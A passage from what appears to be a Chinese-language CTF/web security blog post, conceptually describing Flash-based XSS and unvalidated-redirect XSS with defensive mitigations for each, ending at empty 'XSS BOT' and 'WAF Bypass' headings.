<h2 id="基于-Flash-的跨站-XSS"><a href="#基于-Flash-的跨站-XSS" class="headerlink" title="基于 Flash 的跨站 XSS"></a>基于 Flash 的跨站 XSS</h2><pre><code class="highlight plaintext">基于 Flash 的跨站 XSS 也是属于反射型 XSS 的一种，AS 脚本可以接受用户输入并操作 cookie，攻击者可以配合其他 XSS（持久型或者非持久型）方法将恶意 swf 文件嵌入页面中。主要是因为 AS 有时候需要和 JS 传参交互，攻击者会通过恶意的 XSS 注入篡改参数，窃取并操作cookie。

基于 Flash 的跨站 XSS 的**两种避免方法** **：**①严格管理 cookie 的读写权限；②对 Flash 能接受用户输入的参数进行过滤 escape 转义处理。</code></pre>



<h2 id="未经验证的跳转-XSS"><a href="#未经验证的跳转-XSS" class="headerlink" title="未经验证的跳转 XSS"></a>未经验证的跳转 XSS</h2><pre><code class="highlight plaintext">有一些场景是后端需要对一个传进来的待跳转的 URL 参数进行一个 302 跳转，可能其中会带有一些用户的敏感（cookie）信息。如果服务器端做302 跳转，跳转的地址来自用户的输入，攻击者可以输入一个恶意的跳转地址来执行脚本。

防止未经验证的跳转 XSS漏洞的**两种措施：**①对待跳转的 URL 参数做白名单或者某种规则过滤；②后端注意对敏感信息的保护, 比如 cookie 使用来源验证。</code></pre>

<h2 id="XSS-BOT"><a href="#XSS-BOT" class="headerlink" title="XSS BOT"></a>XSS BOT</h2><h2 id="WAF-Bypass"><a href="#WAF-Bypass" class="headerlink" title="WAF Bypass"></a>WAF Bypass</h2>]]></content>
      <tags>
        <tag>-CTF -Web</tag>
      </tags>
  </entry>
</search>
